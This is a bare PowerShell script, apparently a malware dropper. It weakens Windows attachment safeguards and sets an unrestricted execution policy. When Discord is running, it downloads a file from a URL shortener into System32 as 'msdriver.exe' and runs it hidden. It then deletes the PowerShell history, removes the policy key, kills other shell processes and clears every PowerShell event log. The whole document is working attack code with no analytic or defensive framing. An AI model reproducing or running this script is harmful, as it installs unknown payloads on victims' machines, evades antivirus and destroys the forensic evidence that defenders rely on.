Stop-Process -Name "ctfmon" -Force -ErrorAction SilentlyContinue
Start-Sleep -Milliseconds 500
Start-Process "C:\Windows\System32\ctfmon.exe" -WindowStyle Hidden -ErrorAction SilentlyContinue
Start-Sleep -Seconds 1

$regCommand1 = "reg add 'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments' /v SaveZoneInformation /t REG_DWORD /d 2 /f"
$regCommand2 = "reg add 'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments' /v ScanWithAntiVirus /t REG_DWORD /d 2 /f"

Invoke-Expression $regCommand1 | Out-Null
Invoke-Expression $regCommand2 | Out-Null

Set-ExecutionPolicy Unrestricted -Scope Process -Force | Out-Null

$ctfmonRunning = Get-Process -Name "ctfmon" -ErrorAction SilentlyContinue
$discordRunning = Get-Process -Name "discord" -ErrorAction SilentlyContinue
if ($ctfmonRunning -and $discordRunning) {
    $destination = "C:\Windows\System32\msdriver.exe"
    $url = "https://tinyurl.com/yc78cyjz"
    Invoke-WebRequest -Uri $url -OutFile $destination -ErrorAction SilentlyContinue
    Start-Sleep -Seconds 2
    Start-Process -FilePath $destination -WindowStyle Hidden -ErrorAction SilentlyContinue | Out-Null
}

Clear-History
$historyPath = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt')
if (Test-Path $historyPath) {
    Remove-Item $historyPath -Force -ErrorAction SilentlyContinue | Out-Null
}

$attachmentsRegKeyPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Attachments"
if (Test-Path $attachmentsRegKeyPath) {
    Remove-Item -Path $attachmentsRegKeyPath -Recurse -Force | Out-Null
}

Get-Process -Name "powershell" | Where-Object { $_.Id -ne $PID } | Stop-Process -Force -ErrorAction SilentlyContinue | Out-Null
Get-Process -Name "conhost" -ErrorAction SilentlyContinue | ForEach-Object {
    if ($_.Parent.Id -ne $PID) {
        Stop-Process -Id $_.Id -Force -ErrorAction SilentlyContinue | Out-Null
    }
}

$historyPath = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt')
if (-not (Test-Path $historyPath)) {
    New-Item -Path $historyPath -ItemType File -Force | Out-Null
} else {
    Set-Content -Path $historyPath -Value "" -Force -ErrorAction SilentlyContinue
}

wevtutil el | Where-Object { $_ -match "PowerShell" } | ForEach-Object { wevtutil cl "$_" }

Exit